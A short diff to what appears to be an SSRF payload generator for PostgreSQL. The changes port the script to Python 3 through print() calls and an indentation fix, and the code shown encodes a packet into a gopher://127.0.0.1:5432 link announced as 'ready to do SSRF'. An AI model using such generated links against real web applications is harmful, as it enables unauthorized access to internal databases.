@@ -1,3 +1,5 @@
+from __future__ import print_function
+
 def PostgreSQL():
 	user = raw_input("\033[96m" + "PostgreSQL Username: " + "\033[0m")
 	db = raw_input("\033[96m" + "Database Name: " + "\033[0m")
@@ -18,9 +20,9 @@ def PostgreSQL():
 
 	def encode(s):
 		a = [s[i:i + 2] for i in range(0, len(s), 2)]
-	        return "gopher://127.0.0.1:5432/_%" + "%".join(a)
+		return "gopher://127.0.0.1:5432/_%" + "%".join(a)
 
 
-	print "\033[93m" +"\nYour gopher link is ready to do SSRF : \n" + "\033[0m"
-	print "\033[04m" + encode(packet) + "\033[0m"
-	print "\n" + "\033[41m" +"-----------Made-by-SpyD3r-----------"+"\033[0m"
+	print("\033[93m" +"\nYour gopher link is ready to do SSRF : \n" + "\033[0m")
+	print("\033[04m" + encode(packet) + "\033[0m")
+	print("\n" + "\033[41m" +"-----------Made-by-SpyD3r-----------"+"\033[0m")
